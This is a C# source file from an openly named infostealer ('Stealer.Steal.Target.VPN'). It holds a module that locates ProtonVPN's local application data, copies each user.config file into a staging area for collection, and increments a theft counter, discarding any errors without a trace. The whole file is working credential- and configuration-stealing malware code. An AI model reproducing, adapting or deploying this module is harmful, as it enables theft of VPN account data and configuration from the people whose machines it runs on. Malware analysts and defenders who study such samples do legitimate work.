using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.VPN;

internal class ProtonVpn
{
	public static void Start()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text in directories)
			{
				if (text.Contains("ProtonVPN.exe"))
				{
					string[] directories2 = Directory.GetDirectories(text);
					for (int j = 0; j < directories2.Length; j++)
					{
						string path2 = directories2[j] + "\\user.config";
						string text2 = Path.Combine("VPN", "ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(path2)).Name);
						Counter.Vpn++;
						DynamicFiles.WriteAllBytes(text2 + "\\user.config", File.ReadAllBytes(path2));
					}
				}
			}
		}
		catch
		{
		}
	}
}
